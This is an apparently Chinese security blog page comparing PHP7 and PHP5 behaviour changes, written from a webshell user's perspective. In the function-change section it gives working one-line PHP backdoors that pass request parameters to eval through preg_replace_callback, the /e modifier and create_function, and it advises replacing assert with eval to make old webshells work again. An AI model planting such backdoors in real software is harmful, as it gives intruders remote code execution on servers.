@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>PHP7和PHP5在安全上的区别 | 肖泽的家</title>
+  <meta name="keywords" content=" PHP , PHP7 , 代码审计 , 白盒 ">
+  <meta name="description" content="PHP7和PHP5在安全上的区别 | 肖泽的家">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="PHP7和PHP5在安全上的区别前言之前测试的时候发现很多菜刀的马都不能用了，大马也几乎3/4不能正常在php7运行。网上百度也没有找到太多相关性的文章，就自己总结测试了一下关于安全性上的区别。 函数修改preg_replace()不再支持/e修饰符&amp;lt;?php preg_replace(&amp;quot;/.*/e&amp;quot;,$_GET[&amp;quot;h&amp;quot;],&amp;quot;.&amp;quot;)">
+<meta name="keywords" content="PHP,PHP7,代码审计,白盒">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP7和PHP5在安全上的区别">
+<meta property="og:url" content="http://yoursite.com/2019/02/28/php7-e5-92-8cphp5-e5-9c-a8-e5-ae-89-e5-85-a8-e4-b8-8a-e7-9a-84-e5-8c-ba-e5-88-ab/index.html">
+<meta property="og:site_name" content="肖泽的家">
+<meta property="og:description" content="PHP7和PHP5在安全上的区别前言之前测试的时候发现很多菜刀的马都不能用了，大马也几乎3/4不能正常在php7运行。网上百度也没有找到太多相关性的文章，就自己总结测试了一下关于安全性上的区别。 函数修改preg_replace()不再支持/e修饰符&amp;lt;?php preg_replace(&amp;quot;/.*/e&amp;quot;,$_GET[&amp;quot;h&amp;quot;],&amp;quot;.&amp;quot;)">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/1551362719_5c77ea9f1cc4f.png">
+<meta property="og:image" content="http://yoursite.com/1551367858_5c77feb2207c5.png">
+<meta property="og:image" content="http://yoursite.com/1551364248_5c77f098efc24.png">
+<meta property="og:image" content="http://yoursite.com/1551365388_5c77f50cef9f3.png">
+<meta property="og:image" content="http://yoursite.com/1551366146_5c77f80287efd.png">
+<meta property="og:image" content="http://yoursite.com/1551366193_5c77f8310fe9d.png">
+<meta property="og:image" content="http://yoursite.com/1551366634_5c77f9ea7b536.png">
+<meta property="og:updated_time" content="2019-07-27T19:42:35.213Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP7和PHP5在安全上的区别">
+<meta name="twitter:description" content="PHP7和PHP5在安全上的区别前言之前测试的时候发现很多菜刀的马都不能用了，大马也几乎3/4不能正常在php7运行。网上百度也没有找到太多相关性的文章，就自己总结测试了一下关于安全性上的区别。 函数修改preg_replace()不再支持/e修饰符&amp;lt;?php preg_replace(&amp;quot;/.*/e&amp;quot;,$_GET[&amp;quot;h&amp;quot;],&amp;quot;.&amp;quot;)">
+<meta name="twitter:image" content="http://yoursite.com/1551362719_5c77ea9f1cc4f.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>XiaoZe</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1478023488&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(3)</small></div></li>
+    
+        
+            
+            <li><div data-rel="ThinkPHP"><i class="fold iconfont icon-right"></i>ThinkPHP<small>(2)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="代码审计">代码审计<small>(2)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="代码审计"><i class="fold iconfont icon-right"></i>代码审计<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="安全">安全<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a style="border-right: 1px solid #fff; width: 49%"  class="about site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="3">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">PHP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">PHP7</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">代码审计</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color3">白盒</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color5">0day</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" class="color4">ThinkPHP</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="ThinkPHP 代码审计 "
+           href="/2018/11/22/e6-9f-90-e7-83-ad-e9-97-a8-e8-99-9a-e6-8b-9f-e5-b8-81-e4-ba-a4-e6-98-93-e6-89-800day-e6-8c-96-e6-8e-98-e7-ac-94-e8-ae-b0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="某热门虚拟币交易所0day挖掘笔记">某热门虚拟币交易所0day挖掘笔记</span>
+            <span class="post-date" title="2018-11-22 14:26:29">2018/11/22</span>
+        </a>
+        
+        <a  class="代码审计 安全 "
+           href="/2019/02/28/php7-e5-92-8cphp5-e5-9c-a8-e5-ae-89-e5-85-a8-e4-b8-8a-e7-9a-84-e5-8c-ba-e5-88-ab/"
+           data-tag="PHP,PHP7,代码审计,白盒"
+           data-author="" >
+            <span class="post-title" title="PHP7和PHP5在安全上的区别">PHP7和PHP5在安全上的区别</span>
+            <span class="post-date" title="2019-02-28 23:59:47">2019/02/28</span>
+        </a>
+        
+        <a  class="ThinkPHP 代码审计 "
+           href="/2018/11/17/tinkphp3-2-4-updata-e5-87-bd-e6-95-b0-sql-e6-b3-a8-e5-85-a50day/"
+           data-tag="PHP,代码审计,白盒,0day,ThinkPHP"
+           data-author="" >
+            <span class="post-title" title="ThinkPHP3.2.4-Updata函数SQL注入0day">ThinkPHP3.2.4-Updata函数SQL注入0day</span>
+            <span class="post-date" title="2018-11-17 00:03:26">2018/11/17</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-php7-e5-92-8cphp5-e5-9c-a8-e5-ae-89-e5-85-a8-e4-b8-8a-e7-9a-84-e5-8c-ba-e5-88-ab" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">PHP7和PHP5在安全上的区别</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" data-rel="代码审计">代码审计</a>/
+            
+                <a href="javascript:" data-rel="安全">安全</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color4">PHP</a>
+            
+            <a href="javascript:" class="color5">PHP7</a>
+            
+            <a href="javascript:" class="color5">代码审计</a>
+            
+            <a href="javascript:" class="color3">白盒</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-07-28 03:42:35'>2019-02-28 23:59</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP7和PHP5在安全上的区别"><span class="toc-text">PHP7和PHP5在安全上的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#函数修改"><span class="toc-text">函数修改</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace-不再支持-e修饰符"><span class="toc-text">preg_replace()不再支持/e修饰符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-function-被废弃"><span class="toc-text">create_function()被废弃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-系列全员移除"><span class="toc-text">mysql_*系列全员移除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize-增加一个可选白名单参数"><span class="toc-text">unserialize()增加一个可选白名单参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#assert-默认不在可以执行代码"><span class="toc-text">assert()默认不在可以执行代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#语法修改"><span class="toc-text">语法修改</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#foreach不再改变内部数组指针"><span class="toc-text">foreach不再改变内部数组指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8进制字符容错率降低"><span class="toc-text">8进制字符容错率降低</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#十六进制字符串不再被认为是数字"><span class="toc-text">十六进制字符串不再被认为是数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#移除了-ASP-和-script-PHP-标签"><span class="toc-text">移除了 ASP 和 script PHP 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#超大浮点数类型转换截断"><span class="toc-text">超大浮点数类型转换截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#杂项"><span class="toc-text">杂项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-text">后记</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="PHP7和PHP5在安全上的区别"><a href="#PHP7和PHP5在安全上的区别" class="headerlink" title="PHP7和PHP5在安全上的区别"></a>PHP7和PHP5在安全上的区别</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前测试的时候发现很多菜刀的马都不能用了，大马也几乎3/4不能正常在php7运行。网上百度也没有找到太多相关性的文章，就自己总结测试了一下关于安全性上的区别。</p>
+<h2 id="函数修改"><a href="#函数修改" class="headerlink" title="函数修改"></a>函数修改</h2><h3 id="preg-replace-不再支持-e修饰符"><a href="#preg-replace-不再支持-e修饰符" class="headerlink" title="preg_replace()不再支持/e修饰符"></a>preg_replace()不再支持/e修饰符</h3><pre><code>&lt;?php
+preg_replace(&quot;/.*/e&quot;,$_GET[&quot;h&quot;],&quot;.&quot;); 
+?&gt;</code></pre><p>利用<code>\e</code>修饰符执行代码的后门大家也用了不少了，具体看官方的这段<a href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php" target="_blank" rel="noopener">描述</a>:</p>
+<blockquote>
+<p>如果设置了这个被弃用的修饰符， preg_replace() 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线()和 NULL 字符在 后向引用替换时会被用反斜线转义.</p>
+</blockquote>
+<p>很不幸，在PHP7以上版本不在支持<code>\e</code>修饰符，同时官方给了我们一个新的函数<code>preg_replace_callback</code>： 这里我们稍微改动一下就可以利用它当我们的后门：</p>
+<pre><code>&lt;?php
+preg_replace_callback(&quot;/.*/&quot;,function ($a){@eval($a[0]);},$_GET[&quot;h&quot;]);
+?&gt;</code></pre><p><img src="/1551362719_5c77ea9f1cc4f.png" alt></p>
+<h3 id="create-function-被废弃"><a href="#create-function-被废弃" class="headerlink" title="create_function()被废弃"></a>create_function()被废弃</h3><pre><code>&lt;?php
+$func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();
+?&gt;</code></pre><p>少了一种可以利用当后门的函数，实际上它是通过执行<code>eval</code>实现的。可有可无。</p>
+<h3 id="mysql-系列全员移除"><a href="#mysql-系列全员移除" class="headerlink" title="mysql_*系列全员移除"></a>mysql_*系列全员移除</h3><p>如果你要在PHP7上面用老版本的mysql_*系列函数需要你自己去额外装了，官方不在自带，现在官方推荐的是mysqli或者pdo_mysql。这是否预示着未来SQL注入漏洞在PHP上的大幅减少呢~</p>
+<blockquote>
+<p>去特么的预示，我已经很久没在目标站上挖到过sql注入了，全都是预编译！</p>
+</blockquote>
+<h3 id="unserialize-增加一个可选白名单参数"><a href="#unserialize-增加一个可选白名单参数" class="headerlink" title="unserialize()增加一个可选白名单参数"></a>unserialize()增加一个可选白名单参数</h3><pre><code>$data = unserialize($serializedObj1 , [&quot;allowed_classes&quot; =&gt; true]);
+$data2 = unserialize($serializedObj2 , [&quot;allowed_classes&quot; =&gt; [&quot;MyClass1&quot;, &quot;MyClass2&quot;]]); </code></pre><p>其实就是一个白名单，如果反序列数据里面的类名不在这个白名单内，就会报错。 <img src="/1551367858_5c77feb2207c5.png" alt> 像这样的报错！ 可以是类名也可以是布尔数据，如果是<code>FALSE</code>就会将所有的对象都转换为<code>__PHP_Incomplete_Class</code>对象。<code>TRUE</code>是无限制。也可以传入类名实现白名单。</p>
+<blockquote>
+<p>妈的，还好现在是可选不是必选，要是默认<code>FALSE</code>逼程序员弄白名单那就真的吐血了。</p>
+</blockquote>
+<h3 id="assert-默认不在可以执行代码"><a href="#assert-默认不在可以执行代码" class="headerlink" title="assert()默认不在可以执行代码"></a>assert()默认不在可以执行代码</h3><p>这就是众多马不能用的罪魁祸首了，太多的马用assert()来执行代码了，这个更新基本就团灭，一般情况下修改成eval即可正常运行了~</p>
+<blockquote>
+<p>提一下，菜刀在实现文件管理器的时候用的恰好也是assert函数，这导致菜刀没办法在PHP7上正常运行。</p>
+</blockquote>
+<h2 id="语法修改"><a href="#语法修改" class="headerlink" title="语法修改"></a>语法修改</h2><h3 id="foreach不再改变内部数组指针"><a href="#foreach不再改变内部数组指针" class="headerlink" title="foreach不再改变内部数组指针"></a>foreach不再改变内部数组指针</h3><pre><code>&lt;?php
+$a = array(&apos;1&apos;,&apos;2&apos;,&apos;3&apos;);
+foreach ($a as $k=&gt;&amp;$n){
+    echo &quot;&quot;;
+}
+print_r($a);
+foreach ($a as $k=&gt;$n){
+    echo &quot;&quot;;
+}
+print_r($a);</code></pre><p>这样的代码在php5中，是这样的执行结果： <img src="/1551364248_5c77f098efc24.png" alt> 因为数组最后一个元素的 <code>$value</code> 引用在 <code>foreach</code> 循环之后仍会保留，在第二个循环的时候实际上是对之前的指针不断的赋值。php7中通过值遍历时，操作的值为数组的副本，不在对后续操作进行影响。 这个改动影响了某些cms的洞在PHP7上无法利用了….你知道我指的是哪个洞的。</p>
+<blockquote>
+<p>这个问题在PHP7.0.0以后的版本又被改回去了，只影响这一个版本。</p>
+</blockquote>
+<h3 id="8进制字符容错率降低"><a href="#8进制字符容错率降低" class="headerlink" title="8进制字符容错率降低"></a>8进制字符容错率降低</h3><p>在php5版本，如果一个八进制字符如果含有无效数字，该无效数字将被静默删节。</p>
+<pre><code>&lt;?php
+echo octdec( &apos;012999999999999&apos; ) . &quot;\n&quot;;
+echo octdec( &apos;012&apos; ) . &quot;\n&quot;;
+if (octdec( &apos;012999999999999&apos; )==octdec( &apos;012&apos; )){
+        echo &quot;: )&quot;. &quot;\n&quot;;
+}</code></pre><p>比如这样的代码在php5中的执行结果如下： <img src="/1551365388_5c77f50cef9f3.png" alt> 但是在php7里面会触发一个解析错误。</p>
+<blockquote>
+<p>这个问题同样在PHP7.0.0以后的版本又被改回去了，只影响这一个版本。</p>
+</blockquote>
+<h3 id="十六进制字符串不再被认为是数字"><a href="#十六进制字符串不再被认为是数字" class="headerlink" title="十六进制字符串不再被认为是数字"></a>十六进制字符串不再被认为是数字</h3><p>这个修改一出，以后CTF套路会少很多啊~ 很多骚操作都不能用了~ 这个没什么好说的，大家都懂。</p>
+<pre><code>&lt;?php
+var_dump(&quot;0x123&quot; == &quot;291&quot;);
+var_dump(is_numeric(&quot;0x123&quot;));
+var_dump(&quot;0xe&quot; + &quot;0x1&quot;);
+var_dump(substr(&quot;foo&quot;, &quot;0x1&quot;));
+?&gt;</code></pre><p>以上代码在PHP5运行结果如下： <img src="/1551366146_5c77f80287efd.png" alt> PHP7运行结果如下： <img src="/1551366193_5c77f8310fe9d.png" alt></p>
+<blockquote>
+<p>你以为我要说这个在后续版本被改回去了？不，目前截至最新的PHP7.3版本依然没有改回去的征兆，官方称不会在改了。</p>
+</blockquote>
+<h3 id="移除了-ASP-和-script-PHP-标签"><a href="#移除了-ASP-和-script-PHP-标签" class="headerlink" title="移除了 ASP 和 script PHP 标签"></a>移除了 ASP 和 script PHP 标签</h3><p><img src="/1551366634_5c77f9ea7b536.png" alt> 现在只有<code>&lt;?php ?&gt;</code>这样的标签能在php7上运行了。</p>
+<blockquote>
+<p>字面意思，影响其实不是很大（只是以后骚套路会少一点）。</p>
+</blockquote>
+<h3 id="超大浮点数类型转换截断"><a href="#超大浮点数类型转换截断" class="headerlink" title="超大浮点数类型转换截断"></a>超大浮点数类型转换截断</h3><p>将浮点数转换为整数的时候，如果浮点数值太大，导致无法以整数表达的情况下， 在PHP5的版本中，转换会直接将整数截断，并不会引发错误。 在PHP7中，会报错。</p>
+<blockquote>
+<p>CTF又少一个出题套路，这个问题我只在CTF上见过，影响应该不大。</p>
+</blockquote>
+<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><ol>
+<li><code>exec(), system() passthru()</code>函数对 NULL 增加了保护。</li>
+<li><code>list()</code>不再能解开字符串<code>string</code>变量。</li>
+<li><code>$HTTP_RAW_POST_DATA</code> 被移除。</li>
+<li><code>__autoload()</code> 方法被废弃。</li>
+<li><code>parse_str()</code> 不加第二个参数会直接把字符串导入当前的符号表，如果加了就会转换成一个数组。现在是第二个参数是必选选项了。</li>
+<li>统一不同平台下的整型长度</li>
+<li><code>session_start()</code> 可以加入一个数组覆盖php.ini的配置</li>
+</ol>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这篇文章将保存长期更新和修正。</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> Me Email bad_guys@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>PHP7和PHP5在安全上的区别</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="XiaoZe">XiaoZe</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-02-28, 23:59:47</p>
+    <p><span class="copy-title">最后更新:</span>2019-07-28, 03:42:35</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/02/28/php7-e5-92-8cphp5-e5-9c-a8-e5-ae-89-e5-85-a8-e4-b8-8a-e7-9a-84-e5-8c-ba-e5-88-ab/" title="PHP7和PHP5在安全上的区别">http://yoursite.com/2019/02/28/php7-e5-92-8cphp5-e5-9c-a8-e5-ae-89-e5-85-a8-e4-b8-8a-e7-9a-84-e5-8c-ba-e5-88-ab/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2017 XiaoZe</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" href="javascript:void(0)"></a>
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="//cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min.js"></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#PHP','#PHP7','#代码审计','#白盒','#0day','#ThinkPHP',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("/5.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
